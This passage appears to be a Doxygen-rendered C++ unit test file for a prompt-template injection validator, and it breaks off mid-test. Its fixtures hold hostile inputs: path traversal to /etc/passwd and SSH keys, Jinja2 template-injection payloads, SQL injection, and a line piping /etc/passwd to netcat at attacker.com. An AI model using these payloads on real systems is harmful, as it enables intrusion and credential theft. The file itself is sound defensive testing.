+<codeline lineno="128"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>PATH_DotDotSlashTraversal)<sp/>{</highlight></codeline>
+<codeline lineno="129"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Load<sp/>config<sp/>from:<sp/>../../../../../../etc/passwd&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="130"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="131"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="132"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>../<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="133"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="134"><highlight class="normal"></highlight></codeline>
+<codeline lineno="135"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>PATH_WindowsBackslashTraversal)<sp/>{</highlight></codeline>
+<codeline lineno="136"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;File:<sp/>{{file}}..\\..\\windows\\system32\\config\\sam&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="137"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="138"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="139"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>..\<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="140"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="141"><highlight class="normal"></highlight></codeline>
+<codeline lineno="142"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>PATH_EtcPasswdAccess)<sp/>{</highlight></codeline>
+<codeline lineno="143"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;User<sp/>data<sp/>at:<sp/>/etc/passwd<sp/>{{user}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="144"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="145"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="146"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>/etc/<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="147"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="148"><highlight class="normal"></highlight></codeline>
+<codeline lineno="149"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>PATH_HomeDirectoryAccess)<sp/>{</highlight></codeline>
+<codeline lineno="150"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Home:<sp/>/home/victim/.ssh/id_rsa<sp/>{{key}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="151"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="152"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="153"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>/home/<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="154"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="155"><highlight class="normal"></highlight></codeline>
+<codeline lineno="156"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>PATH_TildeExpansion)<sp/>{</highlight></codeline>
+<codeline lineno="157"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Config<sp/>at:<sp/>~/.config/secret<sp/>{{secret}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="158"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="159"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="160"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>~<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="161"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="162"><highlight class="normal"></highlight></codeline>
+<codeline lineno="163"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="164"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Template<sp/>Injection<sp/>Detection<sp/>Tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="165"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="166"><highlight class="normal"></highlight></codeline>
+<codeline lineno="167"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>TEMPL_TripleBraceEscape)<sp/>{</highlight></codeline>
+<codeline lineno="168"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Render:<sp/>{{{expression}}}<sp/>now&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="169"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="170"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="171"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>{{{<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="172"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="173"><highlight class="normal"></highlight></codeline>
+<codeline lineno="174"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>TEMPL_Jinja2ForLoop)<sp/>{</highlight></codeline>
+<codeline lineno="175"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;{%<sp/>for<sp/>i<sp/>in<sp/>range(1000000)<sp/>%}<sp/>{{i}}<sp/>{%<sp/>endfor<sp/>%}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="176"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="177"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="178"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Jinja2<sp/>control<sp/>structure</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="179"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="180"><highlight class="normal"></highlight></codeline>
+<codeline lineno="181"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>TEMPL_Jinja2Macro)<sp/>{</highlight></codeline>
+<codeline lineno="182"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;{%<sp/>macro<sp/>evil(x)<sp/>%}{{<sp/>x.__class__<sp/>}}{%<sp/>endmacro<sp/>%}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="183"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="184"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="185"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Macro<sp/>injection</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="186"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="187"><highlight class="normal"></highlight></codeline>
+<codeline lineno="188"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>TEMPL_Jinja2Import)<sp/>{</highlight></codeline>
+<codeline lineno="189"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;{%<sp/>import<sp/>&apos;os&apos;<sp/>as<sp/>os<sp/>%}<sp/>{{<sp/>os.system(&apos;pwd&apos;)<sp/>}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="190"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="191"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="192"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Import<sp/>injection</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="193"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="194"><highlight class="normal"></highlight></codeline>
+<codeline lineno="195"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="196"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Edge<sp/>Cases<sp/>and<sp/>Mutation<sp/>Tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="197"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="198"><highlight class="normal"></highlight></codeline>
+<codeline lineno="199"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EDGE_MixedInjectionVectors)<sp/>{</highlight></codeline>
+<codeline lineno="200"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight></codeline>
+<codeline lineno="201"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;Query:<sp/>SELECT<sp/>*<sp/>FROM<sp/>users<sp/>WHERE<sp/>id={{id}};<sp/>|<sp/>cat<sp/>/etc/passwd<sp/>|<sp/>nc<sp/>attacker.com<sp/>4444&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="202"><highlight class="normal"><sp/><sp/><sp/><sp/>);</highlight></codeline>
+<codeline lineno="203"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="204"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="205"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Multiple<sp/>injection<sp/>patterns</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="206"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="207"><highlight class="normal"></highlight></codeline>
+<codeline lineno="208"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EDGE_EncodedInjection)<sp/>{</highlight></codeline>
+<codeline lineno="209"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>This<sp/>is<sp/>a<sp/>limitation:<sp/>we<sp/>detect<sp/>base<sp/>patterns<sp/>but<sp/>not<sp/>encoded<sp/>variants</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="210"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Execute:<sp/>%2e%2e%2f%2e%2e%2fetc%2fpasswd&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="211"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="212"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="213"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>URL<sp/>encoding<sp/>not<sp/>detected;<sp/>would<sp/>need<sp/>additional<sp/>layer</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="214"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="215"><highlight class="normal"></highlight></codeline>
+<codeline lineno="216"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EDGE_EscapeSequences)<sp/>{</highlight></codeline>
+<codeline lineno="217"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Newline:<sp/>{{value}}\\n;<sp/>DROP<sp/>TABLE<sp/>users;<sp/>--&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="218"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="219"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="220"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Embedded<sp/>newline<sp/>with<sp/>SQL;<sp/>depends<sp/>on<sp/>escaping<sp/>in<sp/>runtime</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="221"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="222"><highlight class="normal"></highlight></codeline>
+<codeline lineno="223"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EDGE_LongPayload)<sp/>{</highlight></codeline>
+<codeline lineno="224"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>long_content(5000,<sp/></highlight><highlight class="charliteral">&apos;a&apos;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="225"><highlight class="normal"><sp/><sp/><sp/><sp/>long_content<sp/>+=<sp/></highlight><highlight class="stringliteral">&quot;UNION<sp/>SELECT<sp/>*<sp/>FROM<sp/>admin&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="226"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(long_content);</highlight></codeline>
+<codeline lineno="227"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="228"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="229"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Large<sp/>payload<sp/>with<sp/>SQL</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="230"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="231"><highlight class="normal"></highlight></codeline>
+<codeline lineno="232"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>EDGE_WhitespaceObfuscation)<sp/>{</highlight></codeline>
+<codeline lineno="233"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;SELECT<sp/>\t*\nFROM<sp/>\r<sp/>users<sp/>WHERE<sp/>id={{id}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="234"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="235"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="236"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Whitespace<sp/>obfuscation<sp/>not<sp/>effective</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="237"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="238"><highlight class="normal"></highlight></codeline>
+<codeline lineno="239"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="240"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Safe<sp/>Content<sp/>Tests<sp/>(Negative<sp/>Cases)</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="241"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="242"><highlight class="normal"></highlight></codeline>
+<codeline lineno="243"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SAFE_SimpleInterpolation)<sp/>{</highlight></codeline>
+<codeline lineno="244"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Hello<sp/>{{name}},<sp/>your<sp/>age<sp/>is<sp/>{{age}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="245"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="246"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="247"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(result.valid<sp/>||<sp/>result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>No<sp/>injection<sp/>patterns</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="248"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="249"><highlight class="normal"></highlight></codeline>
+<codeline lineno="250"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SAFE_NaturalLanguage)<sp/>{</highlight></codeline>
+<codeline lineno="251"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight></codeline>
+<codeline lineno="252"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;Process<sp/>the<sp/>following<sp/>request:<sp/>{{user_request}}.<sp/>Please<sp/>respond<sp/>with<sp/>helpful<sp/>information.&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="253"><highlight class="normal"><sp/><sp/><sp/><sp/>);</highlight></codeline>
+<codeline lineno="254"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="255"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="256"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(result.valid<sp/>||<sp/>result.warnings.empty());</highlight></codeline>
+<codeline lineno="257"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="258"><highlight class="normal"></highlight></codeline>
+<codeline lineno="259"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SAFE_StructuredData)<sp/>{</highlight></codeline>
+<codeline lineno="260"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;{\&quot;user\&quot;:<sp/>\&quot;{{user}}\&quot;,<sp/>\&quot;action\&quot;:<sp/>\&quot;{{action}}\&quot;}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="261"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="262"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="263"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(result.valid<sp/>||<sp/>result.warnings.empty());</highlight></codeline>
+<codeline lineno="264"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="265"><highlight class="normal"></highlight></codeline>
+<codeline lineno="266"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SAFE_URLandEmail)<sp/>{</highlight></codeline>
+<codeline lineno="267"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Contact:<sp/>{{email}}<sp/>or<sp/>https://example.com/user/{{user_id}}&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="268"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="269"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="270"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(result.valid<sp/>||<sp/>result.warnings.empty());</highlight></codeline>
+<codeline lineno="271"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="272"><highlight class="normal"></highlight></codeline>
+<codeline lineno="273"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="274"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Comprehensive<sp/>Coverage<sp/>Tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="275"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="276"><highlight class="normal"></highlight></codeline>
+<codeline lineno="277"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>COVER_AllInjectionTypes)<sp/>{</highlight></codeline>
+<codeline lineno="278"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Test<sp/>that<sp/>each<sp/>injection<sp/>type<sp/>can<sp/>be<sp/>detected<sp/>independently</highlight><highlight class="normal"></highlight></codeline>
